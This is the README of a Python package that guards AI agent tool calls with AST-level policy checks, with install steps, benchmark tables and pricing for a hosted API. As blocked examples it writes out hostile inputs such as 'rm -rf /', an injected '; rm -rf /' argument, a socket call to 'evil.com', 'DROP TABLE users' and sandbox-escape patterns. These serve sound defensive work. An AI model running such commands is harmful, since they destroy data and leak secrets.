[![HOL Blue member](https://hol.org/api/registry/listing-badges/8008ce03-bfbd-4504-8f0a-985e4caa4c64/badge.svg)](https://hol.org/registry/plugins/mvikmanners%2Faw1-circuit-breaker)
# aw1-circuit-breaker (v2.1.2)
[![HOL Guard](https://img.shields.io/endpoint?url=https%3A%2F%2Fhol.org%2Fapi%2Fregistry%2Fbadges%2Fplugin%3Fslug%3Dmvikmanners%252Faw1-circuit-breaker%26metric%3Drelease)](https://hol.org/registry/plugins/mvikmanners%2Faw1-circuit-breaker)
<!-- hol-install-block:v2 slug=mvikmanners/aw1-circuit-breaker -->
Install with [HOL Guard](https://hol.org/guard/docs/plugin-scanner/install-with-hol-guard), which checks the [HOL listing](https://hol.org/registry/plugins/mvikmanners%2Faw1-circuit-breaker) and asks before each runtime:
```sh
hol-guard plugin install mvikmanners/aw1-circuit-breaker --apply
```
<!-- /hol-install-block -->
[![HOL Verified](https://img.shields.io/badge/HOL-Source_Verified-10B981?style=for-the-badge&logo=shield)](https://hol.org/blog/stopping-rogue-agents-inside-the-ast-breaker)
[![PyPI](https://img.shields.io/pypi/v/aw1-circuit-breaker?color=blue&style=for-the-badge)](https://pypi.org/project/aw1-circuit-breaker/)
[![Python Matrix](https://img.shields.io/badge/Python-3.10%20%7C%203.11%20%7C%203.12%20%7C%203.13-blue?style=for-the-badge&logo=python)](https://github.com/MvikManners/aw1-circuit-breaker/actions)
[![HOL Scanner CI](https://img.shields.io/github/actions/workflow/status/MvikManners/aw1-circuit-breaker/hol-guard.yml?branch=main&label=HOL%20Scanner%20CI&style=for-the-badge&logo=githubactions)](https://github.com/MvikManners/aw1-circuit-breaker/actions)
[![Zero Dependencies](https://img.shields.io/badge/Runtime_Dependencies-Zero_(Standard_Lib)-blueviolet?style=for-the-badge)](pyproject.toml)
[![Latency](https://img.shields.io/badge/P50_Latency-0.078ms-brightgreen?style=for-the-badge)](tests/test_enterprise_engine.py)
[![MCP Registry](https://img.shields.io/badge/MCP%20Registry-active-0066FF?style=for-the-badge)](https://registry.modelcontextprotocol.io)
[![Glama Score](https://glama.ai/mcp/servers/MvikManners/aw1-circuit-breaker/badges/score.svg)](https://glama.ai/mcp/servers/MvikManners/aw1-circuit-breaker)
[![License: Apache-2.0](https://img.shields.io/badge/License-Apache_2.0-green.svg)](LICENSE)

> **Featured on Hashgraph Online (HOL):** Read the independent source-level teardown: [*What aw1-breaker checks before a tool call*](https://hol.org/blog/stopping-rogue-agents-inside-the-ast-breaker).

`aw1-breaker` is a zero-dependency Python security circuit breaker that intercepts autonomous AI agent tool calls in sub-millisecond execution loops using Abstract Syntax Tree (AST) static policy enforcement, declarative Policy-as-Code, per-actor rolling velocity monitors, and cryptographically signed HMAC execution tokens.

> **Security Scope & Boundary:** `aw1-breaker` enforces deterministic static AST and argument-level boundary policies *prior* to Python runtime execution (blocking prohibited modules, dangerous built-ins, SQL mutations, and known evasion patterns). It provides an application-layer policy gate and is designed to complement, not replace, operating-system-level sandbox isolation (e.g., containers, gVisor, or microVMs) for arbitrary untrusted code execution.

---

### High-Concurrency Performance (v2.1.0 Verified)

Evaluated across a stress test of **10,000 asynchronous agent dispatches** in concurrent batches of 500 simultaneous tasks via `tests/test_enterprise_engine.py`:

| Metric | Result | Industry Standard (LLM-as-a-Judge) |
| :--- | :--- | :--- |
| **Throughput** | **8,485.0 dispatches/sec** | ~5 – 20 req/sec |
| **Median Latency (P50)** | **0.0776 ms** (77.6 µs) | 500 – 1,500 ms |
| **90th Percentile (P90)** | **0.0941 ms** (94.1 µs) | 1,200 – 2,000 ms |
| **95th Percentile (P95)** | **0.1066 ms** (106.6 µs) | 1,500 – 2,500 ms |
| **99th Percentile (P99)** | **0.2263 ms** (226.3 µs) | 2,000 – 4,000 ms |
| **Policy Rejection Latency** | **< 0.13 ms** (Fail-Closed) | N/A (Probabilistic) |
| **Deterministic Guarantee** | **Syntax-Exact AST Grammar Match** | Probabilistic (~85–95%) |

---

## ⚡ 10-Second Test Drive (Zero-Install)

Test the circuit breaker live in your terminal without installing anything:

```bash
uvx aw1-circuit-breaker --demo
```

Or verify an arbitrary snippet:

```bash
uvx aw1-circuit-breaker verify "subprocess.run(['rm', '-rf', '/'])"
```

---

## 📦 Installation

```bash
pip install --upgrade aw1-circuit-breaker
```

*(Zero external dependencies. Pure Python standard library: Python 3.10 to 3.13).*

---

## 🛡️ Enterprise Guard (Turnkey Integration)

Drop enterprise boundary policies directly onto agent tools using the `@guard.protect` or universal `@guard` adapter:

```python
from aw1 import EnterpriseGuard, SecurityViolationError

guard = EnterpriseGuard(
    allowed_tools=["safe_query", "fetch_market_data"],
    max_velocity_per_min=60,
    max_financial_limit=250.0,
    readonly_sql=True
)

@guard.protect(tool_name="safe_query")
def execute_database_query(query: str):
    return db.execute(query)

# Benign queries execute with sub-millisecond policy check overhead
execute_database_query("SELECT id FROM users LIMIT 1;")

# Adversarial AST injections & SQL drops are halted deterministically:
# -> Raises SecurityViolationError: "Database mutation rejected under readonly_sql policy"
```

### Universal Function & Async Gating

```python
from aw1 import guard

@guard
async def run_agent_tool(tool_payload: dict) -> dict:
    return {"status": "ok"}
```

---

## 🔌 Model Context Protocol (MCP) Server

Run directly with Python:

```bash
python mcp_server.py
```

Or via `uvx`:

```bash
uvx aw1-circuit-breaker
```

### MCP Client Configuration

Add to your Claude Desktop or Cursor configuration:

```json
{
  "mcpServers": {
    "aw1-circuit-breaker": {
      "command": "uvx",
      "args": ["aw1-circuit-breaker"]
    }
  }
}
```

---

## ⚔️ Exploit Interception in Action

AW-1 operates deterministically at the Abstract Syntax Tree (AST) level before code reaches Python's runtime execution frame. Probabilistic prompt-based guardrails fail under encoding obfuscation; AST inspection provides deterministic grammar analysis against defined policy boundaries.

### Interception Matrix

| Attack Vector | Attacker Strategy | LLM Guardrail Result | AW-1 AST Circuit Breaker |
| :--- | :--- | :--- | :--- |
| **Dynamic Execution** | `eval(compile(...))` | Evades semantic filters | 🛑 **Tripped (`RESTRICTED_INVOCATION`)** |
| **Shell Escapes** | `subprocess.Popen(['bash', ...])` | Masked as system task | 🛑 **Tripped (`UNAUTHORIZED_MODULE_IMPORT`)** |
| **Lateral Exfiltration** | `socket.connect(('evil.com', 443))` | Disguised as HTTP fetch | 🛑 **Tripped (`UNAUTHORIZED_MODULE_IMPORT`)** |
| **SQL Destruction** | `DROP TABLE users;` | Prompt jailbreak bypass | 🛑 **Tripped (`HALT_SQL_MUTATION_FORBIDDEN`)** |
| **Dunder Introspection** | `().__class__.__subclasses__()` | Bypasses keyword filters | 🛑 **Tripped (`FAIL_CLOSED_REFLECTION_BREACH`)** |

### Run the Showcase

```bash
python examples/enterprise_guard_demo.py
```

---

## 🔬 Autonomous Breakout Benchmark Suite (BRK Gauntlet)

Evaluated against the standardized **BRK Adversarial Vector Suite** across **1,000 randomized execution cycles** via `tests/test_breakout_gauntlet.py`:

| Vector | Exploit Mechanism / Attack Signature | Detection Policy Layer | Single-Dispatch Median Latency | Benchmark Suite Result |
| :--- | :--- | :--- | :--- | :--- |
| **BRK-101** | **Base64 Obfuscation & `eval()` Tunneling:** Encodes command strings in nested base64 structures. | Layer 0 AST Decompiler (`ast_unpacker.py`) | **0.0389 ms** (38.9 µs) | **Intercepted (100% vector pass)** |
| **BRK-102** | **Unauthorized Socket Egress:** Raw TCP sockets targeting credential extraction (`.env`, SSH keys). | Network Socket Gate (`UNAUTHORIZED_MODULE_IMPORT`) | **0.0412 ms** (41.2 µs) | **Intercepted (100% vector pass)** |
| **BRK-103** | **Privilege Escalation Patterns:** Process privilege changes, `chmod 777`, or file alteration calls. | Fail-Closed Policy Arbitrator | **0.0374 ms** (37.4 µs) | **Intercepted (100% vector pass)** |
| **BENIGN** | **Fast-Path Operations:** Read-only queries, valid parameter structures, and benign API dispatches. | Fast-Path AST Validation Bypass | **0.0210 ms** (21.0 µs) | **Permitted (0% False Positives)** |

*Note: The 100% pass metric reflects containment across the specified synthetic vector sets (`BRK-101` through `BRK-103`) in test conditions and is not a claim of universal containment against arbitrary unknown exploit classes.*

### Reproduce the 1,000-Cycle Gauntlet Locally

Run the complete evaluation suite with standard Python (zero external dependencies required):

```bash
python tests/test_breakout_gauntlet.py
```

---

## ⏱️ Runtime Latency Telemetry

Deterministic security must not throttle agent execution. Below are empirical latency measurements substantiated by `benchmark.py` across 1,000 iterations on Python 3.13:

| Evaluation Target | Substantiating Script | P50 Latency | P95 Latency | P99 Latency | Notes |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Full AST Policy Inspection (Benign)** | `benchmark.py` | **0.0889 ms** | 0.1298 ms | 0.1645 ms | Complete AST parse & rule validation |
| **AST Policy Inspection (Adversarial)** | `benchmark.py` | **0.0520 ms** | 0.0919 ms | 0.1051 ms | Short-circuit on first policy violation |
| **Shell Argument Sanitization Pass** | `benchmark.py` | **0.0051 ms** | 0.0096 ms | 0.0195 ms | Pure string argument validation |
| **Concurrent Multi-Task Dispatch** | `tests/test_enterprise_engine.py` | **0.0776 ms** | 0.1066 ms | 0.2263 ms | 500 concurrent tasks (10k total) |

Reproduce locally:

```bash
python benchmark.py
```

---

## 🧩 Framework Integration (LangGraph Example)

AW-1 drops directly into autonomous agent execution nodes prior to tool dispatch:

```python
from examples.langgraph_adapter import execute_agent_action, CircuitBreakerException

# Guard autonomous agent tool dispatches
try:
    execute_agent_action(bash_tool, "bash_tool", {"cmd": "cat log.txt; rm -rf /"})
except CircuitBreakerException as blocked:
    print(f"Tool call halted: {blocked}")
```

---

## 🌐 Cloud REST API Gateway & Production Quotas

The AW-1 Circuit Breaker provides an optional HTTP policy arbitration gateway for microservices, browser frontends, and autonomous agent platforms.

- **Endpoint:** `POST https://p20.laveto.net/wisdom/api/v1/intercept`
- **CORS:** Enabled (`Access-Control-Allow-Origin: *`)
- **Median Arbitration Latency:** `< 0.80 ms` (HTTP roundtrip excluding transport)

### Request Payload

```json
{
  "actor_id": "agent-alpha-01",
  "tool_name": "sql_query",
  "payload": "SELECT id, balance FROM accounts WHERE user_id = 42;"
}
```

### Response Schema

#### 1. Permitted Execution (Token Minted)
```json
{
  "status": "PERMITTED",
  "verdict": "PASS",
  "permitted": true,
  "actor_id": "agent-alpha-01",
  "tool_name": "sql_query",
  "token": "YOUR_KEY_dev_dummy_key_000000000000",
  "reason": "Policy evaluation completed: execution safe",
  "latency_ms": 0.762,
  "circuit_breaker": "AW-1 Sovereign Execution Arbitrator"
}
```

#### 2. Threat Contained (Fail-Closed)
```json
{
  "status": "HALT_AND_CONTAIN",
  "verdict": "FAIL_CLOSED",
  "permitted": false,
  "actor_id": "agent-alpha-01",
  "tool_name": "bash",
  "token": null,
  "reason": "AST Circuit Breaker containment triggered",
  "latency_ms": 0.201,
  "circuit_breaker": "AW-1 Sovereign Execution Arbitrator"
}
```

### Production Quotas & Pricing

| Plan | Pricing (USD / BWP) | Quota & Features | Access / Checkout |
| :--- | :--- | :--- | :--- |
| **Developer Sandbox** | Free | 10,000 requests, HMAC token minting | Code `HOL-BREAKER-2026` |
| **Developer Pro** | $49 / BWP 690 /mo | 50,000 audit requests, 1 license key, offline HMAC validation | [Upgrade to Pro](https://p20.laveto.net/wisdom/buy) |
| **Team / Startup** | $199 / BWP 2,650 /mo | 1,000,000 audit requests, 5 seat keys, Redis state sync | [Upgrade to Team](https://p20.laveto.net/wisdom/buy) |
| **Enterprise Dedicated** | $990 / BWP 13,200 /mo | Unlimited seats, dedicated gateway tenant, custom statutory lenses | [Enterprise Desk](https://p20.laveto.net/wisdom/docs) |

To authenticate with enterprise quotas, pass your signed bearer token in the `Authorization` header:

```bash
curl -X POST [https://p20.laveto.net/wisdom/api/v1/intercept](https://p20.laveto.net/wisdom/api/v1/intercept) \
  -H "Authorization: Bearer AW1-EXEC-TOKEN-..." \
  -H "Content-Type: application/json" \
  -d '{"actor_id": "prod-agent-01", "tool_name": "db_query", "payload": "SELECT 1;"}'
```

---

## License

Licensed under the [Apache License, Version 2.0](LICENSE). See [LICENSE](LICENSE) for details.
